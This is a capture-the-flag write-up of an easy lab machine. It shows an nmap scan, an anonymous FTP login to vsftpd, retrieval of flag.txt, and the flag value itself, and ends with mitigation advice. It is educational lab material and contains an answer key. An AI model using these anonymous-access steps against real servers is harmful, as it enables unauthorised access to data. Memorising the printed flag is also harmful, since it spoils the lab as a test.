
## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Capture flag via FTP
- **Tools Used:** `nmap`, `ftp`, `openvpn`

---

## **Scanning using Nmap**

Started with a nmap scan to get information about whether telnet was running on port 21 as mentioned in the task.
```
$ sudo nmap -sV -p21 10.129.71.129
[sudo] password for alice: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 18:27 IST
Nmap scan report for 10.129.71.129
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds
```

And, it is!

---

## **Accessing FTP at 10.129.71.129**

Now, let's `ftp` into said IP.
```
$ ftp 10.129.71.129
Connected to 10.129.71.129.
220 (vsFTPd 3.0.3)
Name (10.129.71.129:ghost):
```

Trying `anonymous` which usually has a blank password:
```
$ ftp 10.129.71.129
Connected to 10.129.71.129.
220 (vsFTPd 3.0.3)
Name (10.129.71.129:alice): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

---

## **Flag Retrieval**

Next, let's `ls` into the file contents:
```
ftp> ls
229 Entering Extended Passive Mode (|||62735|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
get falg.txt226 Directory send OK.
```

And, there is the flag!
Let's `get` it.
```
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||48920|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************************************************************************************************|    32      376.50 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:02 (0.01 KiB/s)
ftp> exit
221 Goodbye.
```

Once back home, let's `cat` the contents:
```
$ cat flag.txt
035db21c881520061c53e0536e44f815
```

---
## **Flag**

The flag is `035db21c881520061c53e0536e44f815`.

---
## **Lessons Learned**

- It is fair to say that a lot of misconfigured FTP's allow for `anonymous` login without the need for passwords, but when normally configured have very limited access to users. But when misconfigured leave out critical information.
- The best way to mitigate this issue is first of all disable anonymous login in the first place. Next, restrict permissions severely if needed. But also strictly log all activity in anonymous logins.

---

**Prepared by Araiz Naqvi**